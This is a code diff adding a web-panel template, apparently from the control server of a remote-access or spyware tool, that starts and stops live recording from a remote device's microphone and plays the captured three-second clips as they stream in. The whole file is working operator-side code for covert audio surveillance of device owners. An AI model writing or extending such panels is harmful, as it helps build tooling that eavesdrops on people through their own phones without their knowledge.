@@ -1,0 +1,83 @@
+<div class="ui segment">
+    <h3 class="ui grey dividing header">Live Microphone Streaming</h3>
+    <p>Listen to the device microphone in near real-time (3-second clips).</p>
+    <div class="ui buttons">
+        <button class="ui green button" id="startStreamBtn" onclick="startMicStream('<%= deviceID %>')">
+            <i class="icon play"></i> Start Streaming
+        </button>
+        <button class="ui red button" id="stopStreamBtn" onclick="stopMicStream('<%= deviceID %>')" style="display:none">
+            <i class="icon stop"></i> Stop Streaming
+        </button>
+    </div>
+    <div id="streamStatus" class="ui message" style="margin-top:1em;display:none"></div>
+    <div id="streamClips" style="margin-top:1em"></div>
+</div>
+
+<script>
+    var streamActive = false;
+    var audioCtx = null;
+    var streamBuffers = [];
+
+    function startMicStream(deviceID) {
+        var btn = document.getElementById('startStreamBtn');
+        btn.classList.add('loading');
+        var url = '/manage/' + deviceID + '/0xRM?action=start';
+        $.post(url, function (data) {
+            btn.classList.remove('loading');
+            if (data.error) {
+                showNotification('#f03434', data.error);
+            } else {
+                document.getElementById('startStreamBtn').style.display = 'none';
+                document.getElementById('stopStreamBtn').style.display = 'inline-block';
+                document.getElementById('streamStatus').style.display = 'block';
+                document.getElementById('streamStatus').className = 'ui green message';
+                document.getElementById('streamStatus').innerHTML = '<i class="icon microphone"></i> Streaming active...';
+                streamActive = true;
+                showNotification('#2ecc71', 'Streaming started');
+            }
+        });
+    }
+
+    function stopMicStream(deviceID) {
+        var btn = document.getElementById('stopStreamBtn');
+        btn.classList.add('loading');
+        var url = '/manage/' + deviceID + '/0xRM?action=stop';
+        $.post(url, function (data) {
+            btn.classList.remove('loading');
+            document.getElementById('startStreamBtn').style.display = 'inline-block';
+            document.getElementById('stopStreamBtn').style.display = 'none';
+            document.getElementById('streamStatus').style.display = 'block';
+            document.getElementById('streamStatus').className = 'ui yellow message';
+            document.getElementById('streamStatus').innerHTML = '<i class="icon stop"></i> Streaming stopped';
+            streamActive = false;
+            showNotification('#f03434', 'Streaming stopped');
+        });
+    }
+
+    var streamSocket = io();
+    streamSocket.on('mic:chunk', function (data) {
+        if (!streamActive) return;
+        if (data.clientID !== '<%= deviceID %>') return;
+
+        var clipId = data.id;
+        var buffer = data.buffer;
+        if (buffer && buffer.data) {
+            buffer = new Uint8Array(buffer.data);
+        }
+        var blob = new Blob([buffer], { type: 'audio/mp4' });
+        var url = URL.createObjectURL(blob);
+
+        var container = document.getElementById('streamClips');
+        var clipEl = document.createElement('div');
+        clipEl.className = 'ui small message';
+        clipEl.innerHTML = '<i class="icon music"></i> Clip #' + clipId +
+            ' <audio controls style="vertical-align:middle" src="' + url + '"></audio>';
+        container.appendChild(clipEl);
+        clipEl.scrollIntoView({ behavior: 'smooth', block: 'end' });
+
+        var audio = clipEl.querySelector('audio');
+        if (clipId === 0) {
+            audio.play();
+        }
+    });
+</script>
